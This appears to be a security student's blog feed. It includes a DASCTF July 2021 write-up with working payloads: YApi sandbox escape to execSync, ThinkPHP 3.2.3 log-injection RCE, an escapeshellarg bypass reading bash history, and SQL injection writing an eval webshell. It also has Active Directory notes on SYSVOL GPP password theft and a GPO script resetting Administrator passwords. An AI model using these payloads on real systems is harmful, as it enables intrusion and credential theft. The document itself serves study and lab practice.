  <script id="hbeData" type="hbeData" data-hmacdigest="229021ad1902f455de80a1cc99950a53496066700d0899df1c176e8d0752ae81">792211fae0f67a76b537e59fee9c2dab1daa41aa57e19023a9c46972eb7bec605162ac581642f42cb4fadcc908a6dcde966bb263ff9e23df3f37df013b613928a7c1f47986677b593afe1b1a12d171a6d217ba32affbb538d4b2e67a151ad2bcccf594e20f357d8af32445734a5de93275111a1849d1c6380ef7d3613509899e824e57f6402d9157d86339bf1c35fdd7d02152385c75a2b2dec5eca877221e9c03761fa9ae1d2076e657c2a49c69fc366e3f62f82c6cc095fd85ae3bfff90b077afe6f509ddf69b197d6acae3800fa4a4e73fa9bac4ad7c1c3eeaaa8f77bda019bee75d5b69a1f069d6442ecf0dedf64db33e7236cf4d2cd6d397131af4d0cb0673cddbe4f595ad75cac0067b6fa4ea1360eca1aa14259fc35ead18a4793027578d34278cd4c27f452c9d544b19170655ae6347a2c07ec141a433b26efe327de9a6541243bf97697b8b72d69515da1adaa0c1a3fa65af922f057ef8c43222994aff1ec12c0c2925ed4e8052a97afdb1cd6c4a9b25b4d66bbbbc3522fe5ea883c0c88f02f92c5c4edd415dad8d1e80c1f18bb6e6636c48ef32799a8a86ae0a801805260d69876e7d3ffce4c5c46c24bb346ffbda7479f592024dfe1293f9c4082f2f2248a35fcebca655cd02b139254638ecc82e7db8d141a81ab470a9a2582ab1364be25f20f7c0414da5dda8cdced80add8fa4552c0cfcd38407c4af3dfecb2a6d9df32ab0cc3d3108450fb83d65389ec6460de72488b9de1e20192e34b9c2a19e367b361fab61ef52fc2f5d6f76f9906f656c6bd361108032a769a8cc8b5d37b5cdcd12d3bd0cfaa4c41d3b9cbb7ae54a6ad721f8d3640753eb5e417e623b671952005d5b13d8f4d2a8c96769270b18d45d7b050eff938243e1846a747137604277364f8f772c95a96e64493780477e33c4cb841c30e5252af1bf651618beef24ac574c7e9ada427e1c9ee9ad08fa57f940781aeae416fcf4aa2406714ccb6ec4b8c35cb36445859e1b77c1fdeb835a0290cc648197a34e777056ca03491095c5d2c0d114b65b126634bdda88fbaa2255992e959c0e23343fd64ee273d21802d89340d476b63b94a0a5074545fd345e71200f68014c949b8a78685c0c4dc4b9a9996d000c4c84c918b0f11beb34f6ad5dfebdd82d7bbac04dece7f4166ea8a3e2ec769c1807d8ac6f326826a79e81da695d9d644749a6f645860d6d0c0bf588723e2b8261d6143670775e814a2e6bdedb5ed360571d2daaea5bdd7569bf8edaba760a8bad39acf8faaf64ad1b5cb4c635a8b3cc2cab6dd7b4c65bdfc22484fddc5195e71bef65dff26b0256ce6935bc732578fe2401593adb4c28ea8610d433c8f4629f83598a6c162230e7d5a145f288c43d725102181689e336012fa436ceae51dd2c863c8547702963d03bf9a2a5eb7fc0d8d1b9416df62145da069657ea1a5cc69d219277519e6a15be52c01b7c0703ec45c8edf70fe7f5c70e4af7b7b369c0137354694bb4224059223bf59bb6a326aefb378ded522a17b3be9b46d2afb2894051d0ba98cfdf3bd0c27b82345ad87c9fa3ffce43be310ab4bf24f4f0cfd7f3b0593da5be909df02ae788e0bc02a9e75e8dd1b7bac6bf3d74744efeca99171f415b385f2bf5366d99cd501e7a9aaafc5b3b29f38479db3f214f870209fa542850e14c51d50e0e460ed5b72aea0f489932382875d8e7e2bcac11b15d65ac332e1c73b3aa55e9607f903a81c44a3cf15564bc325f164a3d1f6b8eb03d2eb411d052d37e82c35543d78524e11f75d5d341e4945d1af14385d4c064aab188de3881c192f9f99bea0e635b56570af67fed139d1c5c51bb4e64f7b9ea597cf95ef84556302852c1917f485d97110729f4ce7515b0edbc79588c96bafda74dfffcee2beeddf6690cbe8e592ce65a564c09ef082cf2f26b20c7e7a222063866ac1e3c10dc5eece526a6e6f4bcc471866fcf3e7eb6d17f0324433ceefd62a1c33d7a575dd54cd8bee25459aaf5a55dc398496e86fdd5da636817e6cbd34ad5a2cd5de8e687bd3f410e1232ae3fa908053b576bd8dbe76b98474ba6f6ea72577cd100245d33132100d4252416f00957e96e6fe663ea970ab3f628a2e4147bbf8266be946a525887ced8622a26efbb70c3c4a361de612187159e7a67a3de3e6960bc9046471bc2c38ca24493741af9c8e0c07ba6f46515a786c4d88e293419385c70c739b96ccbbecac2d0e99cf5c7d9b49f642371d6ae8bbf72eaf2bb56ec43948cb230ba981db20811aa18e979868ff552aae3dcd8b94e08f9360fb1f1523bee55e74531ba237537019ce89327e035ed1cc9699c0e6967d7b0267daaef30594af2968af60d91e5f2ca3f032281a362b034079ac8433f0a84e34736e0bf97caf753526c7055e52c50a0e5c7940a8d240722c9b47b52f5c275c006dd52dc968e11d805b1e42482a23ea0646abe8de4c6fbc380e59511094828cbffaf4077092b7e3f211b1e41886a7c689f172cab10f6e714df9a0c59af2c4b4b539520fdf286478a4cb6c9e24a84fe9406e4428d6fdd9f9c1b63ce1c279b11273fb808c6372ced74c2f705aebeb00de546e60b42de8c9f0a7bae6d9d805a795c18b6ef879e736ef33a98212914b469f1621cc3c6653db52286299a413caf2f33cb3507f7871632c1a4a65d3f68b1a1dc227c0cb8ae016d91e3b5dfe2634d6a047b609c3e7fda6004c70783f48db9936ea4ae4aecdd671e28641a06682f9cf48041d7c487a4ca81994020d54942d8eaea63ccd4f9f1dc2b486ed8668fb01ff7449d1d0f00f51f6e4e878990f116921c0f7d6a6e1e6a7a8a42a5f4e0c8fa91f29e3766825dd394f544225140a69614aa4a3ce8622807cbeb56af72678dd096304d3dd3ae43211cf2e0384c98b0b34bc3349f16de5818178c810558c668eb71504310a263bd5cc760b48c0259e9f365402e7bc6e16d5b4846476bb6e9299bde1550a553cc431b7fc098ab75f560ac5ea2519cb29a3bc26428b17576dd5fc68d72a3343333f12f1ab76dd3f56992a203c9c4de533b0e7f4cfd2e71e105131478ff6d99d47a26261408f939bc78e66cce766761cd42becfbffdf01dd73e5dab4bb80960d2cddf3964f99a66a3d6dbde126e367df4b4a49be9a1ef27b8c5115b0308165d0d42ef1556e2f1190f8f4bcb0eb836c03d70a1bafddcb18fa3bbfdd79debd67a4f6eba5c1b15b370cdd364d707026b2dc72df353a56c2fb7ca5a5bd259a5f5e1ce8b031c45e115f1988edd2aa890916cf303db0c965cf40447df1f60b06397f8b1cb729484e82ed9a24b2fa2c9c454e39ec094476d69d60dedb34f81b4294e17d8ed6d1cd743bec9b0bdc24089a88a518fcb9b552abc77537175d7566141aa932fa5a7830bb168bc8045c05ec206750cb72f33fc076afe56434a4abb0a4ea8b106448699fbdfa47498ca357af9d2e906f449f56b815b05d662175437945c21d0733deb1ea7403a21fef77d92f3e9154432dd39ab827c4bc91cf46eeb368bf1e486b5f3807efe664da4e1456e9fe0dbe7eb2cbcf77e5b6652ded8dedcf12e1c2a78babe1b2b6767b5491479ce50103db3850b3ef19f211a7230195e18c9e13c214d2d669de6120ca76764919c908eff16d04450136afc9b85be145247abb417c87830e5fc66c4156c64f4d07d9f32545a6657e3e9c4e0639da69daaebb91d6a2884c837f18a0fe8b650c607c6fa8057cad58dc6b7ae732c11aeb3370807724eb11ee0ec60c72e0062b5fd78903858ec594195c90fe77ce91e1a21de0c9778f55cd18ee2aefea66620c482787027f2feb7626906a5e02a94b06252c5749df5323c3b7d84e7f934fc11391f507dece38b4f02418d429523b7ed22232b7fec537ca13b6c668c61fd6fe918c25e0fa0a9112972f6c4d9727512e4031d8f70aa25ba74999e974cf2d68c65db7de5fdc91263d5ac15e839b2fc9e7672af0c27ea66dac97b14bf67046275e00656afb7c434f6879b6d87f1a4ebfe9f381ab19e3cb40bac4ceced63cb89dcea66d5df66c54e103f1c7e4577075657328a0385d15f49cbe1cfcaadfb829de08fb8590acf7c5b8adb224329bbb6dfc7c55974ebcd24580ec2fb80fd8c4f29e882a0e0659e7dcefed4ce96584c5849a44a3eafd6ef1148740a353ccf9a8947e9816f2aedf1fd965303e5a743deca2a31aea196beda48363cc32523b324edc5993f6faa5b00e5fee78d4927931a3da38db17a8b11690e835d6a74aba99de329595f9020840d656c3307390392c192a01cf51ff1620e1e3e86067b3d971e2a298ea5a094f61ddc9ea2e184b8dd8f20d2088f3452681d0659e07060165db54c9c63bfd04c700b87d1759a86fea929adfac844b14b5cac659fb057994d1f861f0c5cf9855ebde504897a223271670d53ff344e6d1e1a872419fd4113b50d29630bcf882fd98b5007ba4892f87d9bb531c1182f7657390237e1fdbd1277688b503f4e5b31facbfe49ef90f8d56af1d898e484046472b8620f9af4bc693d27fa768fb923c9f0468c90cfd09afa3e35e921c247dee0735776afc30e305ad9189f5729c9534ea7d4152ca25c8d38ee69c75f5443a321174deffb11c15f8d4c11fd37b4c1c9fd56bcfb2b13d3918902ec94e1620f79fdfad9c9e1942f2b18706c6cd82af32d41a9b8506d1f52b20759e5fc6986afef6017e091e3e52682267e84131f9a1ed</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是我的qq</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>经历</category>
      </categories>
      <tags>
        <tag>对2020年总结</tag>
      </tags>
  </entry>
  <entry>
    <title>21DASCTFJuly</title>
    <url>/2021/08/01/21DASCTFJuly/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>您的排名：148      慢慢复现有时间</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801183537143.png" alt="image-20210801183537143"></p>
<a id="more"></a>

<h4 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h4><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180135739.png" alt="image-20210801180135739"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) &#123;  </span><br><span class="line">    $cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,$cmd))  &#123;    </span><br><span class="line">    $cmd = escapeshellarg($cmd);    </span><br><span class="line">    system(<span class="string">&#x27;cat &#x27;</span> . $cmd);  &#125;&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180247394.png" alt="image-20210801180247394"></p>
<p>猜测命令执行查看历史命令文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br></pre></td></tr></table></figure>

<p><code>escapeshellarg()</code>函数  把字符串转码为可以在 shell 命令里使用的参数，不会绕过。。。</p>
<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">记录</a></p>
<p>看过wp才知道要想读日志，nginx日志默认路径<code>/var/log/nginx/access.log</code></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123025756.png" alt="image-20210820123025756"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123606239.png" alt="image-20210820123606239"></p>
<p><code>escapeshellarg()</code>利用非ascii字符绕过，%aa,%ba,%fa</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125330839.png" alt="image-20210820125330839"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125339970.png" alt="image-20210820125339970"></p>
<h4 id="YApi"><a href="#YApi" class="headerlink" title="YApi"></a>YApi</h4><p>版本1.9.1   刚爆出个漏洞。</p>
<p>注册，创建项目</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180737592.png" alt="image-20210801180737592"></p>
<p>这里可以命令执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;command&quot;</span>).toString()</span><br></pre></td></tr></table></figure>



<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180857819.png" alt="image-20210801180857819"></p>
<p>保存后，添加接口</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180938961.png" alt="image-20210801180938961"></p>
<p>访问接口</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181000869.png" alt="image-20210801181000869"></p>
<p>即可看到命令执行结果，直接命令执行得flag</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181010300.png" alt="image-20210801181010300"></p>
<p><a href="https://www.pwnwiki.org/index.php?title=Yapi_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">参考：</a></p>
<h4 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h4><p>v3.2.3直接网上找rce</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181452123.png" alt="image-20210801181452123"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>要burp中 执行，url中执行不行</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182210100.png" alt="image-20210801182210100"></p>
<p>查看对应日志文件，注意日志时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;.&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;21_08_01.log</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182233463.png" alt="image-20210801182233463"></p>
<p>命令执行成功，</p>
<p>上马</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182553174.png" alt="image-20210801182553174"></p>
<p>蚁剑连接好像不太行，奇怪有时候可以</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182808593.png" alt="image-20210801182808593"></p>
<p>找到flag</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801183006727.png" alt="image-20210801183006727"></p>
<p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">参考</a></p>
<h4 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h4><p>根据网上爆出了sql注入，在后台登陆处，</p>
<p>然后根据目录扫描<a href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user=fl_html(f1_vvv(fl_value($_POST[<span class="string">&#x27;user&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$password=fl_html(f1_vvv(fl_value($_POST[<span class="string">&#x27;password&#x27;</span>])));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f1_vvv  函数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, $str))&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析源码得到过滤了<code>空格</code>和<code>0x</code>，fl_value函数对一些关键词做了过滤，</p>
<p>判断5列</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912182056650.png" alt="image-20210912182056650"></p>
<p>但是后门写马时候也要注意部分关键字被replace为空格</p>
<p>后门马</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184824092.png" alt="image-20210912184824092"></p>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&amp;password&#x3D;dd&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;16&amp;submit.y&#x3D;29</span><br></pre></td></tr></table></figure>

<p>response</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bad！hacker！&lt;br&gt;sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name&#x3D;&#39;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&#39; limit 0,1</span><br></pre></td></tr></table></figure>

<p>select，outfile要双写</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183311495.png" alt="image-20210912183311495">、</p>
<p>查看后门</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183414063.png" alt="image-20210912183414063"></p>
<p>命令执行</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184256103.png" alt="image-20210912184256103"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DASCTF July X CBCTF 4th</tag>
      </tags>
  </entry>
  <entry>
    <title>2021总结</title>
    <url>/2022/01/11/2021%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><ul>
<li><input checked disabled type="checkbox"> 她依然在</li>
<li><input checked disabled type="checkbox"> 暑假实习</li>
<li><input checked disabled type="checkbox"> 体验线下awd</li>
</ul>
<a id="more"></a>

<ul>
<li><input checked disabled type="checkbox"> 不挂科</li>
<li><input checked disabled type="checkbox"> 加入安全团队，其他师傅好强</li>
<li><input checked disabled type="checkbox"> 对内网有了深入认识和利用方式</li>
</ul>
<ul>
<li><input disabled type="checkbox"> 实战能力太差</li>
<li><input disabled type="checkbox"> 没有挖洞进展</li>
<li><input disabled type="checkbox"> 寒假实习</li>
</ul>
<h2 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h2><ul>
<li><p><input disabled type="checkbox">  运动，锻炼，看书，规律作息</p>
</li>
<li><p><input disabled type="checkbox">  寒假把内网在深入透彻</p>
</li>
<li><p><input disabled type="checkbox">  挖src，CNVD，java代码审计</p>
</li>
<li><p><input disabled type="checkbox">  去古檀，，，，一定一定要通过面试，短期梦想，加油</p>
</li>
</ul>
]]></content>
      <categories>
        <category>经历</category>
      </categories>
      <tags>
        <tag>对2021年总结</tag>
      </tags>
  </entry>
  <entry>
    <title>AD域的攻击方式</title>
    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
<p>win+R键打开运行，输入“gpedit.msc”</p>
<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
<p>添加对应脚本即可</p>
<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
<p>通常用来<code>权限维持</code></p>
<a id="more"></a>

<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p><a href="https://adsecurity.org/?p=2288">在SYSVOL中查找密码并利用组策略首选项 - Active Directory Security (adsecurity.org)</a></p>
<p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
<p>了解下两个默认的共享文件夹SYSVOL和netlogon</p>
<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220411234636929.png" alt="image-20220411234636929"></p>
<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><ul>
<li>保存了域内组策略相关的信息（登陆脚本，组策略数据，等等），</li>
</ul>
<p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问，复制，共享的能力。  在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
<p>目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>

<p>默认所有域用户都能访问DC 的SYSVOL文档</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\win2016dc\SYSVOL</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412000133235.png" alt="image-20220412000133235"></p>
<ul>
<li><p>存储凭据</p>
<p>当创建新的GPP时，在SYSVOL中创建了一个关联的XML文件，其中包含相关的配置数据，并且如果提供了密码，则它是AES-256位加密的</p>
</li>
</ul>
<p>除了在2012年之前的某个时候，<a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">微软在MSDN上发布了AES私钥</a>，可用于解密密码。由于经过身份验证的用户（任何域用户或受信任域中的用户）对 SYSVOL 具有读取访问权限，因此域中的任何人都可以在 SYSVOL 共享中搜索包含“cpassword”的 XML 文件，这是包含 AES 加密密码的值</p>
<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">域渗透——利用SYSVOL还原组策略中保存的密码 (3gstudent.github.io)</a></p>
<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
<p>AD活动目录安装时候自动创建的例如sysvol\shmily.god\scripts</p>
<h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>（Group Policy Object）</p>
<p>组策略对象，即组策略设置的集合，用GPO来存储不同的组策略信息。</p>
<p>安装完AD之后系统<code>默认</code>会存在<code>两个组策略对象</code></p>
<ol>
<li>Default Domain Policy   唯一ID:{31B2F340-016D-11D2-945F-00C04FB984F9}        默认域策略</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001529990.png" alt="image-20220412001529990"></p>
<ol start="2">
<li>Default Domain Controllers Policy   唯一ID(GUID):｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝  默认域控制器策略</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\shmily.god\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412001626442.png" alt="image-20220412001626442"></p>
<p>根据上面截图有4个策略，执行的优先级顺序：</p>
<p>本地策略   站点策略       域策略   OU策略。</p>
<p>GPO作用的范围是DC这个OU</p>
<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
<p>编辑gpo，可以看到gpp相关内容</p>
<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412003126191.png" alt="image-20220412003126191"></p>
<p>Gpp 用来在下面场景存储和使用凭据，通过gpp批量下发策略等 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>







<h1 id="域组策略利用"><a href="#域组策略利用" class="headerlink" title="域组策略利用"></a>域组策略利用</h1><h3 id="下发策略"><a href="#下发策略" class="headerlink" title="下发策略"></a>下发策略</h3><p>将下面代码保存为chpass.vbs ,这个脚本作于是将本地管理员账户的密码修改为abcabc123…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;abcabc123...&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure>

<p>下发策略脚本，将脚本放在对应文件中</p>
<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005407566.png" alt="image-20220412005407566"></p>
<p>域用户机器上进行强制更新组策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure>

<h3 id="读取策略"><a href="#读取策略" class="headerlink" title="读取策略"></a>读取策略</h3><p>域用户搜索对应文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type \\win2016dc\sysvol\shmily.god\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Machine\Scripts\Startup\chpass.vbs</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005607573.png" alt="image-20220412005607573"></p>
<h3 id="寻找策略"><a href="#寻找策略" class="headerlink" title="寻找策略"></a>寻找策略</h3><p>搜索SYSVOL的下的脚本命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;r \\dc\sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc\sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220412005839544.png" alt="image-20220412005839544"></p>
<h1 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>存在没有打补丁的winserver2008上，超过2008版本的系统是没办法写入密码的。</p>
<p>产生原因：使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES 256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密。</p>
<p>但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。</p>
